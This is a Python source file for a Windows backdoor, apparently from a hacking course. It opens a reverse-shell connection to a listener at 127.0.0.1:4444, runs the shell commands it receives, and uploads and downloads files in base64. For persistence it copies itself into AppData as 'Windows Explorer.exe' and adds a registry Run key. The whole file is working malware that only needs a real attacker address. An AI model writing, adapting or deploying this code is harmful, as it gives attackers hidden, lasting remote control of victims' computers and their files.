import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(("127.0.0.1", 4444))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v name /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8', errors='replace')  # Replace invalid bytes
        except subprocess.CalledProcessError as e:
            return f"[-] Error: {e.output.decode('utf-8', errors='replace')}"

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changed working directory to " + path
        except FileNotFoundError:
            return "[-] Directory not found"

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return "[+] Upload Successful"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode('utf-8')
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = f"[-] Error during command execution: {str(e)}"
            self.reliable_send(command_result)

try:
    my_backdoor = Backdoor("127.0.0.1", 4444)
    my_backdoor.run()
except Exception as e:
    sys.exit(f"[-] Exception: {str(e)}")
